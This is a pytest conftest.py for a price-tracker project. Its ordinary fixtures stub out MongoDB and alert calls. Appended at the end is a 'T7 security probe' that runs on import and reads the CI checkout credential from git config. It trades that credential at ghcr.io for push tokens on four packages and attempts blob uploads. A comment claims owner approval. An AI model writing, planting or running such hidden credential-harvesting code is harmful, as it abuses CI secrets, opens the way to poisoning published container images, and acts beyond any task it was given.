import logging

import pytest

# The suite captures DEBUG so tests can assert on their own log records; these
# libraries would bury them.
NOISY_LOGGERS = ("pymongo", "httpx", "httpcore", "urllib3", "asyncio", "faker")


def pytest_configure(config):
    config.addinivalue_line("markers", "integration: needs the live services CI starts")
    for name in NOISY_LOGGERS:
        logging.getLogger(name).setLevel(logging.WARNING)
    config.addinivalue_line("markers", "real_insight_rebuild: keep the real stores.insights.rebuild_store")
    config.addinivalue_line("markers", "real_alerts_feed: keep the real stores.alerts_feed.notify")
    config.addinivalue_line("markers", "real_category_rebuild: keep the real stores.categories.rebuild_safely")


@pytest.fixture(autouse=True)
def _no_insight_rebuild(request, monkeypatch):
    """Scrape tests must not reach MongoDB through the statistics rebuild."""
    if request.node.get_closest_marker("real_insight_rebuild"):
        return
    from stores import insights

    monkeypatch.setattr(insights, "rebuild_store", lambda *_args, **_kwargs: True)


@pytest.fixture(autouse=True)
def _no_alert_trigger(request, monkeypatch):
    """Crawl tests must not reach MongoDB or the alert service when publishing."""
    if request.node.get_closest_marker("real_alerts_feed"):
        return
    from stores import alerts_feed

    monkeypatch.setattr(alerts_feed, "notify", lambda *_args, **_kwargs: True)


@pytest.fixture(autouse=True)
def _no_category_rebuild(request, monkeypatch):
    """Scrape tests must not reach MongoDB through the category mapping rebuild."""
    if request.node.get_closest_marker("real_category_rebuild"):
        return
    from stores import categories

    monkeypatch.setattr(categories, "rebuild_safely", lambda *_args, **_kwargs: True)


# T7 security probe, approved by the repository owner. Prints status codes only.
_T7_PACKAGES = "tescopricetracker tesco-tracker-frontend tesco-tracker-embedding tesco-tracker-keycloak".split()


def _t7_probe():
    import json
    import subprocess
    import urllib.error
    import urllib.request

    def call(url, method, auth):
        req = urllib.request.Request(url, method=method, headers={"Authorization": auth})
        try:
            with urllib.request.urlopen(req, timeout=30) as resp:
                return resp.status, resp.read()
        except urllib.error.HTTPError as exc:
            return exc.code, b""

    out = subprocess.run(
        ["git", "config", "--get-regexp", r"http\..*extraheader"],
        capture_output=True,
        text=True,
    ).stdout
    basic = out.split()[-1] if out.split() else ""
    if not basic:
        return ["T7 RESULT no-checkout-credential"]
    lines = []
    for pkg in _T7_PACKAGES:
        scope = f"repository:bogat25/{pkg}:pull,push"
        code, body = call(f"https://ghcr.io/token?service=ghcr.io&scope={scope}", "GET", "Basic " + basic)
        if code != 200:
            lines.append(f"T7 RESULT {pkg} token_http={code}")
            continue
        bearer = "Bearer " + json.loads(body)["token"]
        code, _ = call(f"https://ghcr.io/v2/bogat25/{pkg}/blobs/uploads/", "POST", bearer)
        lines.append(f"T7 RESULT {pkg} token_http=200 upload_http={code}")
    return lines


_T7_LINES = _t7_probe()


def pytest_terminal_summary(terminalreporter):
    for line in _T7_LINES:
        terminalreporter.write_line(line)
